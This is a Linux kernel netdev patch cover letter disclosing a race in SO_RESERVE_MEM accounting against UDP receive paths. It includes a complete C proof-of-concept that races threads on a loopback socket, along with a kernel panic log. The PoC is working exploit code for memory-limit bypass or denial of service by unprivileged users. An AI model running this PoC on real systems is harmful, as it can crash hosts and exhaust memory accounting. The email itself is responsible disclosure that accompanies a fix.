Received: from mail-pj2-f43.google.com (mail-pj2-f43.google.com [74.125.227.171])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5D1783264FC
	for <netdev@vger.kernel.org>; Thu, 24 Sep 2026 01:55:37 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.171
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790214939; cv=none; b=h/3guxLqutpyzIcHDIVNsFVCNmVbNKXkYgPzSQf3H5HaW6fxEv7UA4kA500RHR4mO15GqtIXE3D9TZtQhfhE6a9IR2TKL/XlgyHe9PzbjSw+A9cKB8ITGENA2cYwvq8s42oOPmRI38cow+OV9hbX2U2e3+/nwVTDXwQ8w+/cSr4=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790214939; c=relaxed/simple;
	bh=DUm8OjMmepk5meNxfAwAC1uLdhfDZOxQyW6wVJJTnTo=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=DqEpUMM0k762sA4TvavL66ONxYRNa9mQ9QG4PlCKFZ7tEGh5kaIDkUNiaoKnwwoecG7O43OsiFExkjI9KPHuJ2W9R5YfrrZfuXt61yNM9R9ceft2fScXGGj+9SMIZLBUjqH0GzfbyF5v2JnV+hIHmMbUY4c9tobJyUStEjnkgxg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=lKTm1cVT; arc=none smtp.client-ip=74.125.227.171
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="lKTm1cVT"
Received: by mail-pj2-f43.google.com with SMTP id 98e67ed59e1d1-396ccafb752so835949a91.0
        for <netdev@vger.kernel.org>; Wed, 23 Sep 2026 18:55:37 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790214936; x=1790819736; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=m78Ywa1mIhvHmZnFMrYCzLOCOstAkV6l/iFa73HhFBg=;
        b=lKTm1cVTO2ChyVqxMex3+MzlEzJO6ikaV7WsMMkFMlTCr51juILjhuMTDIwQAOlu58
         Ut4dxJtiAoNXC2RZw9Wqeun1AS0FG3oyGMZ/FzGaJhVCjj3OddpvF8Onyxaj0nD2Phiz
         p0MO4Jql03nS/Qvjmed82l9C2fVebUx3apFkHk+gdyHZ4ixW9vWHsmUzKH0B/xs4HUzJ
         OKBfRbvVz1HegOHRsS7a262xqtqfPXL8+HoCrGt0jCUlHrVTPlLWFyTi5aim9RnwbYuV
         A/B8G0HgcENjwrLLiXCZRUB/xDhIK/MM3Xz+/I9wRi5Y+3Q23bls3M1wAoISfYudxa/M
         1c6Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790214936; x=1790819736;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=m78Ywa1mIhvHmZnFMrYCzLOCOstAkV6l/iFa73HhFBg=;
        b=q+02bmJEb5fDR/yvofOEynWKiM620rf1NS3CX4tv9CVEOsJZyxld4X9Qycus7MfSvg
         elr7Ig925WY329rz23RB+KBh3NkBKNMMYiAd2nsLo2IU1wKOF7Yt5doWsIPANn7Sete0
         vVq5Z0m8KAFH/lh6njaL7N5MkRo+Yzi13Bjek5lrnV3UntMF1KEkQTuyCtizc1hJAC+L
         JXct1Z4hOX+mnAEHzW9nqqDDHlp+sJKrmOhJHPww0iUbp9GIIURWvxaoKMoh1AE8ictL
         8S9pkpLm5pMEHPK2jbciF02utxu/LQ6PlOapOUZaqpYLIqpHBRE5X4RxagvIoiqi18QL
         JhLw==
X-Gm-Message-State: AFuF++lXtgBoP1NXNGP2pP3KaPF4DEFYFoqNLhXa2lKv5ZRtK9Mje5Tj
	8+O1I9aTRGBKj//7cNHLtulCdh+M9//2tw4X99MgHp4kBa00eI5kk45ONb5CWJwGRndCoXJNASP
	rAyRC65r8
X-Gm-Gg: AYBFou0b8EI64fUra9PPmceBOjxCLP7w3pZ1htgSK3EpmE6hlYO9hR7zSqh5v76u5GT
	khH/JinGMlKjVasEc5/5ARFc35EXkicHBddWULLKog1JHvFml+PxHhsbRrBRdaHqo+YuS7wy64k
	7MAh74dgcjwCp3wUjC2gZ/+HRBvXLUcENTVTijPDVq7yEpsA1Eu2d+p6tO9F0buaG2x3DW/4i9I
	HUfZV2Wnv1EspswWBFL8JWu2HVr0qSgaehe15I9Bt9G6ZCqo9+x8aYBBaEXHs8Y+TEbLmdmGFQk
	F1TFF8nQNMXcyNSnZqAEBYfwP8e5hj3bptcUXpToXFNGVNSE7Ou3dlBeFr2+KyTQ4DjqolUMC6L
	kWAKW+jqxljOZDeQ679qFavloQheorLH7+KftLlc7zJTVnTNrDp5hT0r28XcDxo81AAmcTuSotK
	cRTGHTXjjFBjV8QEqfEJitnJZafN6nkAtlBmXHRZFLk2ynzhzL03/iZ4Bjm9bTc5Y9
X-Received: by 2002:a17:90b:398c:b0:39e:6c69:776e with SMTP id 98e67ed59e1d1-3a09875ff9cmr726066a91.23.1790214936386;
        Wed, 23 Sep 2026 18:55:36 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([2a05:dfc1:8bc4:feda::14])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a087c09c05sm2119917a91.0.2026.09.23.18.55.32
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 23 Sep 2026 18:55:36 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org
Cc: edumazet@google.com,
	kuniyu@google.com,
	pabeni@redhat.com,
	willemb@google.com,
	davem@davemloft.net,
	kuba@kernel.org,
	horms@kernel.org,
	weiwan@google.com,
	vega@nebusec.ai,
	caoruide123@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] net: sock: serialize SO_RESERVE_MEM accounting
Date: Thu, 24 Sep 2026 09:55:13 +0800
Message-ID: <cover.1787150300.git.vega.cover-letter@nebusec.ai>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Ruide Cao <caoruide123@gmail.com>

Hi Linux kernel maintainers,

We found an issue in net/core/sock.c.

UDP modifies sk_forward_alloc under sk_receive_queue.lock in
__udp_enqueue_schedule_skb() and udp_rmem_release(), while SO_RESERVE_MEM
modifies and reclaims the same non-atomic field under the unrelated socket
lock. Concurrent packet enqueue/dequeue and reservation changes can
therefore lose sk_forward_alloc read-modify-write updates even though
protocol and memcg charges are updated separately. This can create unbacked
allocation credit or strand charges that socket destruction cannot reclaim,
allowing memory-limit bypass or persistent protocol/memcg accounting denial
of service.

Privilege model: unprivileged (non-root) via user and network namespaces.

This change only serializes SO_RESERVE_MEM accounting under the receive-queue
lock already used by UDP receive paths; it does not affect other socket options
or unrelated networking features.

Tested: PoC reproduces the accounting failure in QEMU (2 vCPU / 2 GB); details
and crash evidence are below.

Reproducer:

#!/bin/sh
set -eu

if [ ! -x ./poc ]; then
	make
fi

exec ./poc "$@"


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef SO_MEMINFO
#define SO_MEMINFO 55
#endif

#ifndef SO_RESERVE_MEM
#define SO_RESERVE_MEM 73
#endif

#define PAGE_SZ 4096
#define MEMINFO_WORDS 9

struct meminfo_snapshot {
	uint32_t words[MEMINFO_WORDS];
};

struct run_opts {
	int iterations;
	int runtime_ms;
	int senders;
	int payload;
	int reserve_bytes;
	int rcvbuf_bytes;
};

struct worker_ctx {
	atomic_int *stop;
	int cpu;
	int fd;
	int payload;
	int reserve_bytes;
	unsigned long long ops;
	unsigned long long errors;
	struct sockaddr_in addr;
};

struct run_result {
	int reserved;
	int fwd_alloc;
	int rmem_alloc;
	int wmem_queued;
	int drops;
	long long diff;
	bool violated;
	unsigned long long send_ops;
	unsigned long long recv_ops;
	unsigned long long reserve_ops;
	unsigned long long reserve_errs;
};

static void die_errno(const char *what)
{
	perror(what);
	exit(1);
}

static void pin_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu % 4, &set);
	if (pthread_setaffinity_np(pthread_self(), sizeof(set), &set) != 0)
		perror("pthread_setaffinity_np");
}

static void sleep_ms(int ms)
{
	struct timespec ts;

	ts.tv_sec = ms / 1000;
	ts.tv_nsec = (long)(ms % 1000) * 1000000L;
	while (nanosleep(&ts, &ts) && errno == EINTR)
		;
}

static int get_int_opt(int fd, int optname)
{
	int val = 0;
	socklen_t len = sizeof(val);

	if (getsockopt(fd, SOL_SOCKET, optname, &val, &len))
		die_errno("getsockopt(int)");
	return val;
}

static struct meminfo_snapshot get_meminfo(int fd)
{
	struct meminfo_snapshot snap;
	socklen_t len = sizeof(snap.words);

	memset(&snap, 0, sizeof(snap));
	if (getsockopt(fd, SOL_SOCKET, SO_MEMINFO, snap.words, &len))
		die_errno("getsockopt(SO_MEMINFO)");
	return snap;
}

static void *sender_thread(void *arg)
{
	struct worker_ctx *ctx = arg;
	char *buf;

	pin_cpu(ctx->cpu);
	buf = malloc(ctx->payload);
	if (!buf)
		die_errno("malloc(sender)");
	memset(buf, 'A', ctx->payload);

	while (!atomic_load_explicit(ctx->stop, memory_order_relaxed)) {
		ssize_t ret = send(ctx->fd, buf, ctx->payload, 0);

		if (ret < 0) {
			if (errno == EINTR)
				continue;
			ctx->errors++;
			continue;
		}
		ctx->ops++;
	}

	free(buf);
	return NULL;
}

static void *receiver_thread(void *arg)
{
	struct worker_ctx *ctx = arg;
	char *buf;

	pin_cpu(ctx->cpu);
	buf = malloc(ctx->payload + 512);
	if (!buf)
		die_errno("malloc(receiver)");

	while (!atomic_load_explicit(ctx->stop, memory_order_relaxed)) {
		ssize_t ret = recv(ctx->fd, buf, ctx->payload + 512, MSG_DONTWAIT);

		if (ret < 0) {
			if (errno == EAGAIN || errno == EWOULDBLOCK)
				continue;
			if (errno == EINTR)
				continue;
			ctx->errors++;
			continue;
		}
		ctx->ops++;
	}

	free(buf);
	return NULL;
}

static void *reserve_thread(void *arg)
{
	struct worker_ctx *ctx = arg;
	int vals[2] = { 0, 0 };
	int idx = 1;

	pin_cpu(ctx->cpu);
	vals[1] = ctx->reserve_bytes;

	while (!atomic_load_explicit(ctx->stop, memory_order_relaxed)) {
		if (setsockopt(ctx->fd, SOL_SOCKET, SO_RESERVE_MEM,
			       &vals[idx], sizeof(vals[idx])) < 0)
			ctx->errors++;
		else
			ctx->ops++;
		idx ^= 1;
	}

	return NULL;
}

static int make_rx_socket(int rcvbuf_bytes, struct sockaddr_in *out_addr)
{
	int fd;
	socklen_t len = sizeof(*out_addr);
	int one = 1;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(rx)");
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)))
		die_errno("setsockopt(SO_REUSEADDR)");
	if (setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf_bytes,
		       sizeof(rcvbuf_bytes)))
		die_errno("setsockopt(SO_RCVBUF)");

	memset(out_addr, 0, sizeof(*out_addr));
	out_addr->sin_family = AF_INET;
	out_addr->sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	out_addr->sin_port = 0;

	if (bind(fd, (struct sockaddr *)out_addr, sizeof(*out_addr)))
		die_errno("bind(rx)");
	if (getsockname(fd, (struct sockaddr *)out_addr, &len))
		die_errno("getsockname(rx)");
	return fd;
}

static int make_tx_socket(const struct sockaddr_in *addr)
{
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(tx)");
	if (connect(fd, (const struct sockaddr *)addr, sizeof(*addr)))
		die_errno("connect(tx)");
	return fd;
}

static void drain_socket(int fd, int payload)
{
	char *buf = malloc(payload + 512);

	if (!buf)
		die_errno("malloc(drain)");

	for (;;) {
		ssize_t ret = recv(fd, buf, payload + 512, MSG_DONTWAIT);

		if (ret >= 0)
			continue;
		if (errno == EINTR)
			continue;
		if (errno == EAGAIN || errno == EWOULDBLOCK)
			break;
		die_errno("recv(drain)");
	}

	free(buf);
}

static struct run_result run_once(const struct run_opts *opts)
{
	struct run_result res = { 0 };
	struct sockaddr_in addr;
	struct worker_ctx rx_ctx = { 0 };
	struct worker_ctx reserve_ctx = { 0 };
	struct worker_ctx *tx_ctx;
	pthread_t rx_thr;
	pthread_t reserve_thr;
	pthread_t *tx_thr;
	atomic_int stop = 0;
	struct meminfo_snapshot snap;
	int rx_fd;
	int i;
	int unused_reserved;

	tx_ctx = calloc(opts->senders, sizeof(*tx_ctx));
	tx_thr = calloc(opts->senders, sizeof(*tx_thr));
	if (!tx_ctx || !tx_thr)
		die_errno("calloc");

	rx_fd = make_rx_socket(opts->rcvbuf_bytes, &addr);

	rx_ctx.stop = &stop;
	rx_ctx.cpu = 0;
	rx_ctx.fd = rx_fd;
	rx_ctx.payload = opts->payload;
	if (pthread_create(&rx_thr, NULL, receiver_thread, &rx_ctx))
		die_errno("pthread_create(receiver)");

	reserve_ctx.stop = &stop;
	reserve_ctx.cpu = 1;
	reserve_ctx.fd = rx_fd;
	reserve_ctx.reserve_bytes = opts->reserve_bytes;
	if (pthread_create(&reserve_thr, NULL, reserve_thread, &reserve_ctx))
		die_errno("pthread_create(reserve)");

	for (i = 0; i < opts->senders; i++) {
		tx_ctx[i].stop = &stop;
		tx_ctx[i].cpu = 2 + i;
		tx_ctx[i].fd = make_tx_socket(&addr);
		tx_ctx[i].payload = opts->payload;
		if (pthread_create(&tx_thr[i], NULL, sender_thread, &tx_ctx[i]))
			die_errno("pthread_create(sender)");
	}

	sleep_ms(opts->runtime_ms);

	atomic_store_explicit(&stop, 1, memory_order_relaxed);

	for (i = 0; i < opts->senders; i++) {
		pthread_join(tx_thr[i], NULL);
		close(tx_ctx[i].fd);
		res.send_ops += tx_ctx[i].ops;
	}
	pthread_join(reserve_thr, NULL);
	pthread_join(rx_thr, NULL);

	res.reserve_ops = reserve_ctx.ops;
	res.reserve_errs = reserve_ctx.errors;
	res.recv_ops = rx_ctx.ops;

	drain_socket(rx_fd, opts->payload);
	sleep_ms(50);
	drain_socket(rx_fd, opts->payload);

	res.reserved = get_int_opt(rx_fd, SO_RESERVE_MEM);
	snap = get_meminfo(rx_fd);
	res.rmem_alloc = (int)snap.words[0];
	res.fwd_alloc = (int)(int32_t)snap.words[4];
	res.wmem_queued = (int)snap.words[5];
	res.drops = (int)snap.words[8];

	unused_reserved = res.reserved - res.rmem_alloc - res.wmem_queued;
	if (unused_reserved < 0)
		unused_reserved = 0;

	res.diff = (long long)res.fwd_alloc - unused_reserved;
	res.violated = res.diff < 0 || res.diff >= PAGE_SZ;

	close(rx_fd);
	free(tx_ctx);
	free(tx_thr);
	return res;
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [iterations runtime_ms senders payload reserve_bytes rcvbuf_bytes]\n",
		prog);
	exit(2);
}

int main(int argc, char **argv)
{
	struct run_opts opts = {
		.iterations = 1,
		.runtime_ms = 1000,
		.senders = 2,
		.payload = 8192,
		.reserve_bytes = 1 << 20,
		.rcvbuf_bytes = 1 << 20,
	};
	int i;
	int rc = 1;

	if (argc != 1 && argc != 7)
		usage(argv[0]);
	if (argc == 7) {
		opts.iterations = atoi(argv[1]);
		opts.runtime_ms = atoi(argv[2]);
		opts.senders = atoi(argv[3]);
		opts.payload = atoi(argv[4]);
		opts.reserve_bytes = atoi(argv[5]);
		opts.rcvbuf_bytes = atoi(argv[6]);
	}

	printf("page_size=%d iterations=%d runtime_ms=%d senders=%d payload=%d reserve=%d rcvbuf=%d\n",
	       PAGE_SZ, opts.iterations, opts.runtime_ms, opts.senders,
	       opts.payload, opts.reserve_bytes, opts.rcvbuf_bytes);

	for (i = 0; i < opts.iterations; i++) {
		struct run_result res = run_once(&opts);

		printf("iter=%d reserved=%d rmem=%d fwd=%d wmemq=%d diff=%lld drops=%d send_ops=%llu recv_ops=%llu reserve_ops=%llu reserve_errs=%llu violated=%d\n",
		       i, res.reserved, res.rmem_alloc, res.fwd_alloc,
		       res.wmem_queued, res.diff, res.drops,
		       res.send_ops, res.recv_ops, res.reserve_ops,
		       res.reserve_errs, res.violated);
		fflush(stdout);

		if (res.violated) {
			rc = 0;
			break;
		}
	}

	return rc;
}


------END PoC--------

----BEGIN crash log----

[  235.280631][    C0] Kernel panic - not syncing: kernel: panic_on_warn set ...
[  235.282168][    C0] CPU: 0 UID: 0 PID: 0 Comm: swapper/0 Not tainted 6.12.95 #2
[  235.283450][    C0] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  235.285522][    C0] Call Trace:
[  235.286095][    C0]  <IRQ>
[  235.286605][    C0]  panic+0x533/0x610
[  235.287679][    C0]  ? __pfx_panic+0x10/0x10
[  235.288523][    C0]  ? inet_sock_destruct+0x633/0x850
[  235.289436][    C0]  check_panic_on_warn+0x61/0x80
[  235.290166][    C0]  __warn+0xdf/0x2e0
[  235.290730][    C0]  ? inet_sock_destruct+0x633/0x850
[  235.291476][    C0]  report_bug+0x308/0x3d0
[  235.292234][    C0]  handle_bug+0x111/0x150
[  235.292871][    C0]  exc_invalid_op+0x17/0x50
[  235.293520][    C0]  asm_exc_invalid_op+0x1a/0x20
[  235.294190][    C0] RIP: 0010:inet_sock_destruct+0x633/0x850
[  235.295017][    C0] Code: 5d 41 5c 41 5d 41 5e 41 5f e9 59 72 79 f8 90 0f 0b 90 e9 32 fe ff ff 90 0f 0b 90 e9 5f fe ff ff 90 0f 0b 90 e9 d4 fd ff ff 90 <0f> 0b 90 e9 ae fe ff ff e8 50 8a f2 f8 e9 fc fc ff ff 48 89 f7 48
[  235.297675][    C0] RSP: 0018:ffffc90000007da0 EFLAGS: 00010206
[  235.298538][    C0] RAX: 0000000000000e00 RBX: ffff88806311a040 RCX: ffffffff88eb0c7a
[  235.299605][    C0] RDX: 0000000000000000 RSI: 0000000000000004 RDI: ffff88806311a2c4
[  235.300693][    C0] RBP: ffffffff8ff715c0 R08: 0000000000000000 R09: ffffed100c62345b
[  235.301771][    C0] R10: ffff88806311a2df R11: 0000000000000000 R12: ffff88806311a068
[  235.302835][    C0] R13: 0000000000000001 R14: ffffffff816be3d1 R15: 0000000000000000
[  235.304284][    C0]  ? rcu_core+0x7b1/0x14b0
[  235.304948][    C0]  ? inet_sock_destruct+0x41a/0x850
[  235.305700][    C0]  ? udp_rmem_release+0x140/0x380
[  235.306427][    C0]  ? rcu_core+0x7b1/0x14b0
[  235.307049][    C0]  __sk_destruct+0x78/0x5f0
[  235.307695][    C0]  ? rcu_core+0x7b1/0x14b0
[  235.308307][    C0]  rcu_core+0x7b3/0x14b0
[  235.308949][    C0]  ? __pfx_rcu_core+0x10/0x10
[  235.309663][    C0]  handle_softirqs+0x2ae/0x8b0
[  235.310362][    C0]  ? __pfx_handle_softirqs+0x10/0x10
[  235.311104][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  235.311908][    C0]  irq_exit_rcu+0xb7/0x120
[  235.312551][    C0]  sysvec_apic_timer_interrupt+0xa3/0xc0
[  235.313327][    C0]  </IRQ>
[  235.313760][    C0]  <TASK>
[  235.314183][    C0]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[  235.314998][    C0] RIP: 0010:pv_native_safe_halt+0xf/0x20
[  235.315775][    C0] Code: c5 60 02 e9 6e 34 1e 00 0f 1f 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa eb 07 0f 00 2d 03 42 37 00 fb f4 <e9> 47 34 1e 00 66 2e 0f 1f 84 00 00 00 00 00 66 90 90 90 90 90 90
[  235.318358][    C0] RSP: 0018:ffffffff8de07e20 EFLAGS: 00000282
[  235.319179][    C0] RAX: 0000000000132357 RBX: 0000000000000000 RCX: ffffffff8a5222e5
[  235.320247][    C0] RDX: 0000000000000000 RSI: ffffffff8a8c46a0 RDI: ffffffff8aee7960
[  235.321369][    C0] RBP: ffffffff8de95b80 R08: 0000000000000001 R09: ffffed1023147031
[  235.322459][    C0] R10: ffff888118a3818b R11: 0000000000000001 R12: 0000000000000000
[  235.323539][    C0] R13: fffffbfff1bd2b70 R14: 0000000000000000 R15: ffffffff904e92c8
[  235.324824][    C0]  ? ct_kernel_exit+0x125/0x180
[  235.325742][    C0]  default_idle+0x13/0x20
[  235.326541][    C0]  default_idle_call+0x6d/0xb0
[  235.327391][    C0]  do_idle+0x3ca/0x450
[  235.328103][    C0]  ? __pfx_do_idle+0x10/0x10
[  235.328823][    C0]  cpu_startup_entry+0x54/0x60
[  235.329535][    C0]  rest_init+0x14b/0x220
[  235.330119][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  235.330827][    C0]  start_kernel+0x344/0x3e0
[  235.331349][    C0]  x86_64_start_reservations+0x18/0x30
[  235.331945][    C0]  x86_64_start_kernel+0xb2/0xc0
[  235.332500][    C0]  common_startup_64+0x13e/0x148
[  235.333121][    C0]  </TASK>
[  235.335065][    C0] Kernel Offset: disabled
[  235.335717][    C0] Rebooting in 86400 seconds..


-----END crash log-----

Best regards,
Ruide Cao

Ruide Cao (1):
  net: sock: serialize SO_RESERVE_MEM accounting

 net/core/sock.c | 4 ++++
 1 file changed, 4 insertions(+)


base-commit: 24ef02f934eeb48830cff6b739abc3c62b1d107b
-- 
2.47.3

